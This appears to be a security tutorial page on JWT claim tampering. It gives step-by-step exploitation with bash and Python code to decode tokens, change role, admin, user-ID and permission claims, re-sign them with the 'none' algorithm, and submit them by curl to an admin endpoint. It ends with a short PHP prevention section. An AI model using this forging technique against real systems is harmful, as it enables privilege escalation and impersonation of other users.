# 1.1 Claim Tampering

## Goal

Modify JWT payload claims to escalate privileges without cryptographic signature validation.

---

## Understanding Claims

JWT payload contains user information:

```json
{
  "sub": "user123",
  "role": "user",         // ← MODIFY THIS
  "admin": false,         // ← MODIFY THIS
  "permissions": ["read"],// ← MODIFY THIS
  "iat": 1516239022,
  "exp": 1516242622
}
```

**Key Question:** Does server validate signature AND re-check claims from database?

If NO → You can modify and server accepts!

---

## How Claim Tampering Works

```
Original: {"role":"user","admin":false}
Modified: {"role":"admin","admin":true}
Signature: Doesn't match new payload

Server response:
- If validates signature → FAILS
- If doesn't validate → SUCCEEDS ✓
```

---

## Step-by-Step Exploitation

### Step 1: Find JWT Token

Check locations:
- `Authorization: Bearer eyJ...`
- Cookie: `jwt=eyJ...`
- Browser localStorage
- URL parameter: `?token=eyJ...`
- POST body

### Step 2: Decode Token

**Using jwt.io:**
1. Go to https://jwt.io
2. Paste token in "Encoded"
3. View decoded payload
4. Screenshot claims

**Using command line:**
```bash
TOKEN="eyJhbGciOiJSUzI1NiJ9..."
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2)
echo $PAYLOAD | base64 -d | jq .
```

**Using Python:**
```python
import jwt
payload = jwt.decode(token, options={"verify_signature": False}, algorithms=["RS256"])
print(payload)
```

### Step 3: Identify Target Claims

Look for:
- `"role": "user"` → Change to `"admin"`
- `"admin": false` → Change to `true`
- `"uid": "123"` → Change to impersonate
- `"permissions": ["read"]` → Add admin permissions

### Step 4: Modify Token

**Using jwt.io:**
1. Change payload JSON
2. Encoded section updates automatically
3. Copy new token

**Using Python:**
```python
payload['role'] = 'admin'
payload['admin'] = True
modified = jwt.encode(payload, "", algorithm="none")
print(modified)
```

### Step 5: Submit Modified Token

```bash
curl -H "Authorization: Bearer MODIFIED_TOKEN" \
     https://api.target.com/admin
```

### Step 6: Verify Success

- ✅ 200 OK = Success
- ✅ Admin data returned = Vulnerable
- ❌ 401/403 = Failed

## Common Vulnerable Claims

### role Claim
```json
{"role":"user"} → {"role":"admin"}
Impact: Privilege escalation
```

### admin Flag
```json
{"admin":false} → {"admin":true}
Impact: Admin features enabled
```

### User ID
```json
{"sub":"user123"} → {"sub":"admin_id"}
Impact: Impersonate admin
```

### Permissions Array
```json
{"permissions":["read"]} → {"permissions":["read","write","delete","admin"]}
Impact: Gain all permissions
```

## Prevention for Developers

❌ **BAD:**
```php
$role = $jwt['role'];
if ($role == 'admin') grant_access();
```

✅ **GOOD:**
```php
$decoded = JWT::decode($token, $key, ['RS256']);
$user = DB::find($decoded->sub);  // Fetch from DB
if ($user->role == 'admin') grant_access();
```
